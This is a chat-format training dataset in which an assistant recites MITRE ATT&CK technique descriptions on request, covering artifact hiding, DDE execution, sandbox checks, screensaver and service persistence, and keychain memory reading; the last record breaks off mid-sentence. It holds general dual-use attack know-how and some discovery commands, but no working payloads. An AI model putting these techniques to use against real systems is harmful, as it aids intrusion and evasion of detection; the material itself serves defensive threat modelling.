{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Hide Artifacts' and with the Id: T1564 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Hide Artifacts' and with the Id: T1564 is described as follows: Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020). The systems targeted by this attack pattern are: Linux, macOS, Windows, Office 365 ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Dynamic Data Exchange' and with the Id: T1559.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Dynamic Data Exchange' and with the Id: T1559.002 is described as follows: Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation: BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021 Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Malicious File' and with the Id: T1204.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Malicious File' and with the Id: T1204.002 is described as follows: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.Adversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) While [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Identify Business Tempo' and with the Id: T1591.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Identify Business Tempo' and with the Id: T1591.003 is described as follows: Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization\u2019s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim\u2019s hardware and software resources.Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Security Software Discovery' and with the Id: T1063 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Security Software Discovery' and with the Id: T1063 is described as follows: Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on the system. This may include things such as local firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1063) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.### WindowsExample commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.### MacIt's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.. The systems targeted by this attack pattern are: macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Hardware' and with the Id: T1592.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Hardware' and with the Id: T1592.001 is described as follows: Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: hostnames, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Compromise Hardware Supply Chain](https://attack.mitre.org/techniques/T1195/003) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Taint Shared Content' and with the Id: T1080 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Taint Shared Content' and with the Id: T1080 is described as follows: Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.. The systems targeted by this attack pattern are: Windows, Office 365, SaaS, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Trust Modification' and with the Id: T1484.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Trust Modification' and with the Id: T1484.002 is described as follows: Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.Manipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002) without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.(Citation: AADInternals zure AD Federated Domain) An adversary may also add a new federated identity provider to an identity tenant such as Okta, which may enable the adversary to authenticate as any user of the tenant.(Citation: Okta Cross-Tenant Impersonation 2023). The systems targeted by this attack pattern are: Windows, Azure AD, SaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Symmetric Cryptography' and with the Id: T1573.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Symmetric Cryptography' and with the Id: T1573.001 is described as follows: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.. The systems targeted by this attack pattern are: Linux, Windows, macOS, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Local Account' and with the Id: T1087.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Local Account' and with the Id: T1087.001 is described as follows: Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.Commands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code> on macOS and Linux can list local users and groups.(Citation: Mandiant APT1)(Citation: id man page)(Citation: groups man page) On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS the <code>dscl . list /Users</code> command can be used to enumerate local accounts.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Securityd Memory' and with the Id: T1167 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Securityd Memory' and with the Id: T1167 is described as follows: In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple\u2019s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. (Citation: OS X Keychain) (Citation: External to DA, the OS X Way) Apple\u2019s securityd utility takes the user\u2019s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user\u2019s password, but once the master key is found, an attacker need only iterate over the other values to unlock the final password. (Citation: OS X Keychain)If an adversary can obtain root access (allowing them to read securityd\u2019s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user\u2019s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc. (Citation: OS X Keychain) (Citation: OSX Keydnap malware). The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Social Media Accounts' and with the Id: T1586.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Social Media Accounts' and with the Id: T1586.001 is described as follows: Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001)), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. A variety of methods exist for compromising social media accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.Adversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Application Access Token' and with the Id: T1527 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Application Access Token' and with the Id: T1527 is described as follows: Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)For example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.. The systems targeted by this attack pattern are: SaaS, Office 365 ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Safe Mode Boot' and with the Id: T1562.009 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Safe Mode Boot' and with the Id: T1562.009 is described as follows: Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.(Citation: Microsoft Safe Mode)(Citation: Sophos Snatch Ransomware 2019)Adversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.(Citation: Microsoft bcdedit 2021)Adversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)). Malicious [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) objects may also be registered and loaded in safe mode.(Citation: Sophos Snatch Ransomware 2019)(Citation: CyberArk Labs Safe Mode 2016)(Citation: Cybereason Nocturnus MedusaLocker 2020)(Citation: BleepingComputer REvil 2021). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Screensaver' and with the Id: T1180 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Screensaver' and with the Id: T1180 is described as follows: Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\\Windows\\System32\\</code>, and <code>C:\\Windows\\sysWOW64\\</code> on 64-bit Windows systems, along with screensavers included with base Windows installations. The following screensaver settings are stored in the Registry (<code>HKCU\\Control Panel\\Desktop\\</code>) and could be manipulated to achieve persistence:* <code>SCRNSAVE.exe</code> - set to malicious PE path* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executedAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. (Citation: ESET Gazer Aug 2017). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'TFTP Boot' and with the Id: T1542.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'TFTP Boot' and with the Id: T1542.005 is described as follows: Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image](https://attack.mitre.org/techniques/T1601) to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result in the network device running a modified image. (Citation: Cisco Blog Legacy Device Attacks). The systems targeted by this attack pattern are: Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Windows Service' and with the Id: T1543.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Windows Service' and with the Id: T1543.003 is described as follows: Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. Adversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).To make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Fast Flux DNS' and with the Id: T1568.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Fast Flux DNS' and with the Id: T1568.001 is described as follows: Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast Flux - Welivesecurity)The simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity)In contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Checks' and with the Id: T1497.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Checks' and with the Id: T1497.001 is described as follows: Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`.Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output.  Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Cron' and with the Id: T1053.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Cron' and with the Id: T1053.003 is described as follows: Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code.(Citation: 20 macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.An adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). . The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Domain Groups' and with the Id: T1069.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Domain Groups' and with the Id: T1069.002 is described as follows: Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.Commands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Vulnerabilities' and with the Id: T1588.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Vulnerabilities' and with the Id: T1588.006 is described as follows: Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)An adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Spearphishing Link' and with the Id: T1566.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Spearphishing Link' and with the Id: T1566.002 is described as follows: Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)Adversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)Adversaries may also utilize spearphishing links to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s that grant immediate access to the victim environment. For 